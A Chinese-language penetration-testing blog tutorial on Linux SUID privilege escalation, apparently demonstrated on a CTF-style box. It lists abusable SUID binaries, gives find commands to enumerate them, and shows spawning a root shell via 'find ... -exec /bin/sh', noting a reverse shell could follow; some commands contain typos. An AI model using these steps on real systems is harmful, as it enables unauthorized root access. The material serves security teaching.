---
title: Linux的SUID提权
date: 2019-11-15 11:15:40
categories:
- Tools
- Penetration Test
tags:
- Strategy
---
## 背景

&emsp;&emsp;SUID是set uid的简称，它出现在文件所属主权限的执行位上面，标志为 s 。当设置了SUID后，UMSK第一位为4。我们知道，我们账户的密码文件存放在/etc/shadow中，而/etc/shadow的权限为 ----------。也就是说：只有root用户可以对该目录进行操作，而其他用户连查看的权限都没有。当普通用户要修改自己的密码的时候，可以使用passwd这个指令。passwd这个指令在/bin/passwd下，当我们执行这个命令后，就可以修改/etc/shadow下的密码了。那么为什么我们可以通过passwd这个指令去修改一个我们没有权限的文件呢？这里就用到了suid，suid的作用是让执行该命令的用户以该命令拥有者即root的权限去执行，意思是当普通用户执行passwd时会拥有root的权限，这样就可以修改/etc/passwd这个文件了。(命令：`chmod u+s  文件名`)

![](/img/suid/suid1.png)

&emsp;&emsp;使用suid需要满足的几个条件:

* SUID只对可执行文件有效

* 调用者对该文件有执行权

* 在执行过程中，调用者会暂时获得该文件的所有者权限

* 该权限只在程序执行的过程中有效

<!-- more -->

## 发现

&emsp;&emsp;已知的可用来提权的linux可行性的文件列表如下：

* nmap

* vim

* find

* bash

* more

* less

* nano

* cp

&emsp;&emsp;以下命令可以发现系统上运行的所有SUID可执行文件。

```bash
#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000-print2>/dev/null
find / -user root -perm -4000-exec ls -ldb {} \;
```

## 演示

&emsp;&emsp;假设我们已经获得了某台服务器的shell，但是账户权限比较低。

![](/img/suid/suid2.png)

&emsp;&emsp;使用命令`find / -perm -u=s -type f 2>/dev/null`寻找满足提权条件的可执行文件，本次实验使用find。

![](/img/suid/suid3.png)

&emsp;&emsp;执行命令`find flag4.txt -exec /bin/sh \;`，实现提权。

![](/img/suid/suid4.png)

&emsp;&emsp;可以继续执行反弹shell的命令，最后反弹回来的shell也会是root权限，这里就不做演示了。